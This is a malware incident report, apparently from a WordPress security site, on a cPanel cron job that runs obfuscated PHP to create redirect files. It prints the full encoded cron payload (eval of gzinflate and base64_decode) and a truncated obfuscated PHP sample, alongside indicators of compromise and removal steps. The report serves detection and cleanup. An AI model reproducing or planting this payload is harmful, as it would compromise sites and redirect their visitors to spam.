---
title: "Cron Job Code Injection"
slug: "cron-job-code-injection"
reportDate: "2026-01-24"
threatType: "Cron Malware"
severity: "High"
fileHash: "malicious-cron-jobs"
detectedPaths: ["cron-command.txt","sample.txt"]
screenshots: ["/images/wordpress-threats/malicious-cron-jobs_evidence-1.png","/images/wordpress-threats/malicious-cron-jobs_evidence-2.png","/images/wordpress-threats/malicious-cron-jobs_evidence-3.png","/images/wordpress-threats/malicious-cron-jobs_evidence-4.png","/images/wordpress-threats/malicious-cron-jobs_evidence-5.png"]
vtLink: "https://www.virustotal.com/gui/home/upload"
vtScore: "Zero-Day (Unique)"
impact: "The site may experience security issues, including unauthorized redirects that harm SEO and user trust. Performance degradation and further security exploits are likely."
seenOn: "cPanel Cron Jobs"
behavior: "Redirects users to spam sites"
difficulty: "Moderate"
recurrence: "Medium"
numberOfSiteFixed: "The user did not specify the number of sites fixed."
---

## Technical Analysis
The malware uses a cron job scheduled in cPanel to execute a malicious PHP command. The PHP command utilizes 'eval' with 'gzinflate' and 'base64_decode' to execute obfuscated and potentially harmful code. This hidden execution method is responsible for creating additional malicious files, leading to unwanted redirects within the site. The file 'cron-command.txt' confirms the presence of the malicious cron job.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain
1. Step 1: Cron job executes a scheduled PHP command.
2. Step 2: PHP command decodes and executes obfuscated malicious code.
3. Step 3: Malicious code generates files that redirect the site to spammy URLs.

## Code Signature(s)

### FILE: `cron-command.txt`
```txt
/usr/local/bin/php -r 'eval(gzinflate(base64_decode("jVJrb6JAFP3ur2ATEzRtNiCtptk0u9WKq2JpUXm42RgchjIyDBQGBTb97zvgs49kdz4wd5h7zj1z7q1FXtQLiavbGDk2hQ3emoWCSmikru86oAhbD7MQKS1vszLmG8sceVYw8kBLTpzBIrICPVekrmgFWWSJN6EzEBNFcraKgVOrlYmLgV4okoZXZjexTA0rRraxDA0DdL21f94hteW3JzNaqGv/SkWji4W58FYyhWbPAyuc5eY0AuPqrDljvPVNkXYVPXJgsbgxxGtgiMKLKdOVibfE7I1YDgUjcYvMuTfX5a476VutpxnYTvT9f51xySLLy5wSP9YZvsfkrakzXtMLkA879izMVWnSnhTD9tDvYieQk3FPc+eCPtV9fWrkzlCXtSez6A4e/L40ue8Tc+p3huvSs0npWVF65uJrAPIoWqCrF9t8cEFwg1aSVpR1oZQBFQvxWM467n0YuYGAVEm45Zvfam5KAEUh4d53pp7AuMn9qdU4tjBKKNeouynGjzb1Lrl6kicUBn2yYTEIHci2yKYUxqTJ3XIpYWjEqArYWNkJbF8tHVim7WhZ3ZK1noRpDCDLdxGGy2dIlyAkFBKanGrtc5HLNaIYPi8DmwKv8ab+jqZZquX2K4Y0jckO+nok+HLOsJd7xLOguoHJP5h22hEBYRxDQDX4DDP2hoTGyxhG2AZsrCHPfeX4jV1tmL/k+B/f7TiujnbOnxt4MIPA7fTgR6XzQPauFOPiT4/+BHwu5PCkX8LvfaOYgsefj8u+qrDo7fWRZM96+nww79z+E+x/fCtbHVAUHNpexWft5i44UdjBUoIR8T+MQjUsUfrZsHzyCBqmpeCzjGNVlvFa+ws=")));'
```


### FILE: `sample.txt`
```txt
<?php
$wp_link_pages_yb = array ('7X15W9tI8vD/+RTCkx3Z','gzG2gUyCMTkIJOSAhCMn','WT+yDltYF5KMbTL57m9V','d0vqllq2IZnZ/T3vMkOw','u6urq6ur7zru3Q/GkTEx','tYE/ti+VrlLZsB5t9R+0','Hhlmf6NpPdT1pv7nVktr','P9AfmQ+a7YePTOths918','YPSbza12X3vYapkb7Xbr','oaWbD/Wth5XOvfuBHXqa','bluDPmL8zbC2MLXvGr42','hRT1wHbM6K3mqZB6Y9x4','9lUczAZ+DHlxODYhdTod','etGNjsDnZwdrDxHSG400','+3I4G44x3TW2qvd7p/sn','H/ZPvqovz87e9c7hW+/p','i/2jM/VbrXPvnm0pVdMN','4hkAvjs+Pfuqzvqm6VxC','bk35fk+Bn3wGIE7q7tz7','QVGs2FFkxoBj7/j49eH+','V0nNLwEJYFUaSkWLPdd3','KlkVk+GVPbxxr6fVpQrW','Fb6htYyKpCXlTU4bNQ6d','mekY8diJxtAiLQy1WbXy','wvcHjgkVVE6dcRjgh7en','R8/8GD/ZWk8L9aF9bYb4','9bPmGeYUP51obt+BRKAE','cSMpQWgOeq4W68Oquq4C','7bYbOL5hVtW/1LpYO7ZM','XbcxeQnC8WdoaoYZVgnU','eqvRVDabm8oRyMaBP/YM','lZGBP+bUjum3H4Wuor3q','muMRhx4hRAB/Nhlo0xwF','+UzgoK373nW1Mo6ttYfY','QzmpqSuhNw36Y72AGGFv','KTZJk+QUO/ogHJYQzPLu','Qi8r+svJDXzDvTFK6E0y','70JwUvaXUxzH3k14VUJx','knkXipOyv14kAtcZlYkE','zbuTSNCiP0EuDMp71tjT','Y9v3MvRaFF9Px4D2cnLj','TD1zqKfzVpoC9Pa1yHyw','2TM9HWcWDphiZ2gyQMOk','gDQ9gXJszXIuh+PxDa5E','FZaqD/qX2pVhjvvDSz79','KjY1PbyJr0cOwjc7bAKH','5Uqpirk7ShSHjumlFfLc','t/wQ4N3YDa/C2cQmqBTu','e1aYaxYHsLrKYys2RB+G','VT80krq/CqRBb/xbIbkp','8q8Z6rR7UswCMxpdvqoc','JF/L6qqYiWIpcmi3O49F','yU8/NLWRiOrHPfETiBH+','Cc14HHr57uapp4vlE9uz','ezg+VDMM/bDn+ANYfryx','40B+lgnJPQIQQW5TyHK1','ac+cmvoYBbcX266ZgEA2','+d5zbNeOq81klwGrZoSw','uu8GWmhW371814NBcnp4','fFRX1K3GRqMJKNQdNeUB','QeVqA1vvXY392Ix64dhD','1AQpjpzFeP9sbBbwYqlB','HvUg0KsEIpPQZFjqmjt1','h9dTrXp/6gwnAyPM9xLj','ux316D4ig3tMdxZQV1BV','U0S41qcg2ygDdhA5WjQ0','o6xsh+vj3KSF8p0RRZI4','8GQyykHRRH7mSVt4M5n1','+wO7X00aZthmtbIDY9RV','XDMe+kY38KN4d8f2gnGs','xLPA7AZaFE1gDCme5tJv','QnY07kP3K9eaMza76u6u','uruzjvh2K7Tv0rqzvd/9','a8sKL2277wbAn6vAvjYm','s5l2lW1E2STLAZLdaAZK','Gwdyo/v+CNpQirKwZ+T3','+HN2Q9hOnMx//12pDqHD','quoAGKNmi0UC0AW6pDiX','3e/Wc+U7/EC/3Z4byPnr','L2UpSGVlHt2ZnPDrFxID','Ihz7jj+BbSn0PHwj4/D4','FCaFurJRI/yoTGyvknam','dROORtF4HM7G5MADmXCC','+aGYTmSWwXj2VKUj/354','aQ3jqytIJZPSACelSLPM','ngtzHm6BCY
```


## Indicators of Compromise (IOCs)
- `gzinflate(base64_decode`
- `eval`
- `/usr/local/bin/php -r`

## Removal Protocol
1. Step 1: Access the cPanel and navigate to Cron Jobs.
1. Step 2: Identify and remove any suspicious or unfamiliar cron jobs.
1. Step 3: Check the file system for any generated malicious files and delete them.
1. Step 4: Ensure no remaining traces of the PHP command or associated scripts.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
